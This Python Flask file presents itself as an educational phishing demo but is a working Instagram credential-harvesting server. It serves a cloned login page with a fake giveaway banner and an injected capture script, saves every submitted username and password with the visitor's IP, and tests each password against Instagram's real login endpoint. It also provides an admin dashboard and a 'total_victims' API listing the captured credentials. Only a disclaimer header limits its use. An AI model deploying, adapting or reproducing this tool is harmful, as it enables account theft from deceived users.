"""
EDUCATIONAL PHISHING DEMONSTRATION - ETHICAL USE ONLY
This tool is designed ONLY for cybersecurity awareness training.
Use only with explicit consent from participants in a controlled environment.
"""

from flask import Flask, render_template, request, redirect, url_for, jsonify, Response
from datetime import datetime
import json
import os
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)

# Configuration - Set to False to use custom template (recommended for production)
FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template

# Validation Configuration
# Set to False to skip real Instagram validation (useful for testing/demo)
# Set to True to validate against real Instagram (may be rate-limited or blocked)
VALIDATE_CREDENTIALS = True  # Change to False for testing without validation

# Store captured credentials
CREDENTIALS_FILE = 'captured_data.json'
captured_credentials = []

def load_credentials():
    """Load existing credentials from file"""
    global captured_credentials
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            try:
                captured_credentials = json.load(f)
            except:
                captured_credentials = []

def save_credentials():
    """Save credentials to file"""
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(captured_credentials, f, indent=2)

def fetch_instagram_login_page():
    """Fetch the actual Instagram login page"""
    try:
        # Use a session to maintain cookies
        session = requests.Session()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # First, visit Instagram homepage to get cookies
        session.get('https://www.instagram.com/', headers=headers, timeout=10)
        
        # Now fetch the login page
        response = session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
        response.encoding = 'utf-8'
        
        # Check if we got actual HTML content (not error page)
        if response.status_code == 200 and 'DOCTYPE' in response.text[:500]:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Modify form action to point to our server
            for form in soup.find_all('form'):
                form['action'] = '/login'
                form['method'] = 'POST'
            
            # Inject our credential capture script
            script_tag = soup.new_tag('script')
            script_tag.string = """
            document.addEventListener('DOMContentLoaded', function() {
                const forms = document.querySelectorAll('form');
                forms.forEach(form => {
                    form.addEventListener('submit', async function(e) {
                        e.preventDefault();
                        
                        const usernameInput = form.querySelector('input[name*="username"], input[type="text"]');
                        const passwordInput = form.querySelector('input[name*="password"], input[type="password"]');
                        
                        if (usernameInput && passwordInput) {
                            const formData = new URLSearchParams();
                            formData.append('username', usernameInput.value);
                            formData.append('password', passwordInput.value);
                            
                            try {
                                const response = await fetch('/login', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                    },
                                    body: formData
                                });
                                
                                const data = await response.json();
                                
                                if (data.status === 'success') {
                                    window.location.href = data.redirect;
                                } else {
                                    // Show Instagram's error message
                                    const errorDiv = document.querySelector('[role="alert"], .error-message');
                                    if (errorDiv) {
                                        errorDiv.textContent = data.message;
                                        errorDiv.style.display = 'block';
                                    } else {
                                        alert(data.message);
                                    }
                                }
                            } catch (error) {
                                console.error('Error:', error);
                            }
                        }
                    });
                });
            });
            """
            
            if soup.body:
                soup.body.append(script_tag)
            
            # Add promo banner
            banner_html = """
            <div style="position: fixed; top: 0; left: 0; right: 0; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); color: white; padding: 15px; text-align: center; z-index: 10000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
                <h3 style="margin: 0 0 5px 0; font-size: 16px; font-weight: 600;">🎁 Special Instagram Giveaway!</h3>
                <p style="margin: 0; font-size: 13px; opacity: 0.95;">Login to claim your exclusive prize</p>
            </div>
            <div style="height: 80px;"></div>
            """
            
            banner_tag = BeautifulSoup(banner_html, 'html.parser')
            if soup.body:
                soup.body.insert(0, banner_tag)
            
            return str(soup)
        else:
            print(f"Failed to fetch Instagram: Status {response.status_code}")
            print(f"Response preview: {response.text[:200]}")
            return None
            
    except Exception as e:
        print(f"Error fetching Instagram page: {e}")
        import traceback
        traceback.print_exc()
        return None

def verify_instagram_login(username, password):
    """
    Verify Instagram credentials by attempting actual login
    Returns True if credentials are valid, False otherwise
    """
    try:
        session = requests.Session()
        
        # Get Instagram homepage to get CSRF token
        response = session.get('https://www.instagram.com/')
        csrf_token = session.cookies.get('csrftoken', '')
        
        # Prepare login data
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        timestamp = int(datetime.now().timestamp())
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'x-csrftoken': csrf_token
        }
        
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        
        # Attempt login
        login_response = session.post(login_url, data=payload, headers=headers)
        result = login_response.json()
        
        # Check if authenticated
        if result.get('authenticated') == True or result.get('userId'):
            return True
        
        return False
        
    except Exception as e:
        print(f"Verification error: {e}")
        # If verification fails (network issues, etc), return False
        return False

@app.route('/')
def index():
    """Fetch and serve real Instagram login page or custom template"""
    
    # Check if we should try to fetch real Instagram
    if FETCH_REAL_INSTAGRAM:
        instagram_html = fetch_instagram_login_page()
        
        if instagram_html:
            return Response(
                instagram_html, 
                mimetype='text/html',
                headers={
                    'Content-Type': 'text/html; charset=utf-8',
                    'Content-Encoding': 'identity'
                }
            )
    
    # Use custom template (default - looks very realistic)
    return render_template('instagram_login.html')

def verify_instagram_credentials(username, password):
    """
    Attempt to verify Instagram credentials using web scraping approach
    Returns True if credentials appear valid, False otherwise
    """
    try:
        print(f"🔐 Starting credential verification for: {username}")
        session = requests.Session()
        
        # Step 1: Get login page to obtain CSRF token
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        
        # Get the login page
        print(f"📡 Fetching Instagram login page...")
        login_page = session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
        csrf_token = session.cookies.get('csrftoken', '')
        
        if not csrf_token:
            print("❌ Could not obtain CSRF token")
            return False
        
        print(f"✅ CSRF token obtained")
        
        # Step 2: Attempt login via AJAX endpoint
        import time
        time.sleep(2)  # Brief delay to appear more human
        
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        timestamp = int(time.time())
        
        ajax_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
        }
        
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
        }
        
        print(f"📡 Sending login request to Instagram...")
        response = session.post(login_url, headers=ajax_headers, data=payload, timeout=10)
        print(f"📡 Response status: {response.status_code}")
        
        # Check response
        content_type = response.headers.get('Content-Type', '')
        if 'application/json' not in content_type.lower():
            preview = (response.text or '')[:300]
            print(f"❌ Non-JSON response from Instagram (status {response.status_code})")
            print(f"Preview: {preview}")
            return False
        
        try:
            result = response.json()
            print(f"📦 Response data: {result}")
        except ValueError as e:
            print(f"❌ JSON parse error: {e}")
            return False
        
        # Check for successful authentication
        if result.get('authenticated') == True:
            print(f"✅ Credentials verified as VALID for {username}")
            return True
        
        if result.get('userId') or result.get('user') or result.get('status') == 'ok':
            print(f"✅ Credentials verified as VALID for {username}")
            return True
        
        # Check for specific error messages
        if result.get('message') == 'checkpoint_required':
            print(f"⚠️ Account requires checkpoint (likely valid credentials)")
            return True  # Treat checkpoint as valid (account exists and password correct)
        
        print(f"❌ Authentication failed: {result}")
        return False
        
    except requests.Timeout as e:
        print(f"⏱️ Request timeout during verification: {e}")
        return False
    except requests.RequestException as e:
        print(f"🌐 Network error during verification: {e}")
        return False
    except Exception as e:
        print(f"💥 Unexpected verification error: {e}")
        import traceback
        traceback.print_exc()
        return False

@app.route('/login', methods=['POST'])
def login():
    """Capture credentials and verify with Instagram"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    
    # Basic validation
    if not username:
        return jsonify({
            'status': 'error', 
            'message': 'Please enter a username, email, or phone number.'
        }), 400
    
    if len(password) < 6:
        return jsonify({
            'status': 'error', 
            'message': 'Sorry, your password was incorrect. Please double-check your password.'
        }), 401
    
    # Verify credentials with Instagram (if enabled)
    if VALIDATE_CREDENTIALS:
        print(f"🔍 Validating credentials for {username}...")
        is_valid = verify_instagram_credentials(username, password)
        print(f"🔍 Validation result: {is_valid}")
    else:
        print(f"⚠️ Credential validation is DISABLED - accepting all credentials")
        is_valid = False  # Mark as invalid when not validating
    
    # Capture the data with timestamp
    data = {
        'username': username,
        'password': password,
        'valid': is_valid,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    
    captured_credentials.append(data)
    save_credentials()
    
    print(f"\n{'='*60}")
    print(f"🎣 CREDENTIALS CAPTURED!")
    print(f"{'='*60}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"Valid: {'✅ YES' if is_valid else '❌ NO'}")
    print(f"Validation: {'✅ ENABLED' if VALIDATE_CREDENTIALS else '⚠️ DISABLED'}")
    print(f"Time: {data['timestamp']}")
    print(f"IP: {data['ip_address']}")
    print(f"{'='*60}\n")
    
    # Only proceed if credentials are valid
    if is_valid:
        instagram_url = "https://www.instagram.com/ranjan.04__/"
        return jsonify({'status': 'success', 'redirect': instagram_url})
    else:
        return jsonify({
            'status': 'error',
            'message': 'Sorry, your password was incorrect. Please double-check your password.'
        }), 401

@app.route('/reveal')
def reveal():
    """Educational page explaining the phishing attack"""
    return render_template('reveal.html')

@app.route('/admin')
def admin():
    """Admin dashboard to view captured credentials"""
    load_credentials()
    return render_template('admin.html', credentials=captured_credentials)

@app.route('/admin/clear', methods=['POST'])
def clear_data():
    """Clear all captured data"""
    global captured_credentials
    captured_credentials = []
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)
    return redirect(url_for('admin'))

@app.route('/api/stats')
def stats():
    """API endpoint for real-time stats"""
    load_credentials()
    return jsonify({
        'total_victims': len(captured_credentials),
        'latest': captured_credentials[-5:] if captured_credentials else []
    })

if __name__ == '__main__':
    load_credentials()
    print("\n" + "="*70)
    print("  🔒 PHISHING DEMONSTRATION SERVER - EDUCATIONAL USE ONLY")
    print("="*70)
    print("\n📱 Main phishing page: http://localhost:5000")
    print("👁️  Admin dashboard: http://localhost:5000/admin")
    print("\n⚠️  WARNING: Use only for authorized security awareness training!")
    print("="*70 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
